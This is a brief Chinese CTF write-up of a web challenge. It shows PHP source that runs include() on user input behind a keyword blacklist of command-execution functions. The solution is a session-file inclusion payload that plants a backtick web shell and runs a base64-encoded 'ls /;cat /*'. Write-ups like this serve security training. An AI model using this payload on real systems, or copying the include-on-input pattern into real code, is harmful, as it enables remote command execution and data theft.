# 安全检测

Assign: su an, Richmond Phantom
Status: Completed
Tag: WEB

相关资料/地址

### 过程

![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled.png](/assets/%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled.png)

请求的url后会写到session里请求的不能有空格 否则无法预览 页面 扫端口无果

一头雾水 然后队友发现admin(有一说一 这题目真的脑瘫

![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%201.png](/assets/%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%201.png)

```python
<?php
$u=$_GET['u'];

$pattern = "\/\*|\*|\.\.\/|\.\/|load_file|outfile|dumpfile|sub|hex|where";
$pattern .= "|file_put_content|file_get_content|fwrite|curl|system|eval|assert";
$pattern .="|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore";
$pattern .="|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|.log|\@|:\/\/|flag|access|error|stdout|stderr";
$pattern .="|file|dict|gopher";
//累了累了，饮茶先

$vpattern = explode("|",$pattern);

foreach($vpattern as $value){    
    if (preg_match( "/$value/i", $u )){
        echo "检测到恶意字符";
        exit(0);
    }
}

include($u);

show_source(__FILE__);
?>
```

直接文件包含session就好了 没空格就用$_GET

```
http://127.0.0.1/admin/include123.php?u=/tmp/sess_00caa6eb6466d7285aea5af21eb5f6a1&a=<?php;$a=base64_decode($_GET[0]);echo`$a`;?>&0=bHMgLztjYXQgLyo=
```

![%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%202.png](/assets/%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B%20d9f770ac241f4aa49c9eb3db61fdfee5/Untitled%202.png)

### FLAG

`flag{xx}`